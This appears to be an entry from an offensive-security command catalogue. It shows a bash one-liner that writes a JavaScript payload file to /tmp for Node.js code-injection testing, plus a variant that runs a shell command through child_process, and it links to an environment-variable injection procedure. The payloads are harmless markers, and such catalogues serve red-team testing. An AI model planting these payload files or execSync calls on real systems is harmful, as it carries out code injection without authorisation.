---
id: cmd-create-mal-js
data: >-
  echo 'console.log(\"Code injected successfully!\");
  require(\"fs\").writeFileSync(\"/tmp/priv-esc.txt\", \"Escalation achieved via
  Node.js capabilities\");' > /tmp/malicious.js
tags:
  - injection
  - payload
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.341Z'
verified: false
validated: true
submitted: true
---
# create-malicious-js

## Command

```bash
echo 'console.log(\"Code injected successfully!\"); require(\"fs\").writeFileSync(\"/tmp/priv-esc.txt\", \"Escalation achieved via Node.js capabilities\");' > /tmp/malicious.js
```

## Description

This command creates a malicious JavaScript file for injection testing in Node.js environments, demonstrating code execution via require.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo ... > /tmp/malicious.js` | Payload script that logs and writes a file | Yes |

## Examples

### Basic Usage

```bash
echo 'console.log(\"Injected!\");' > /tmp/malicious.js
```

### Advanced Usage

```bash
echo 'require(\"child_process\").execSync(\"id\");' > /tmp/malicious.js
```

## Expected Output

File `/tmp/malicious.js` created; no console output from this command itself.

## Related

- [[commands/export-node-options]]
- [[procedures/Inject-Code-via-Environment-Variables]]
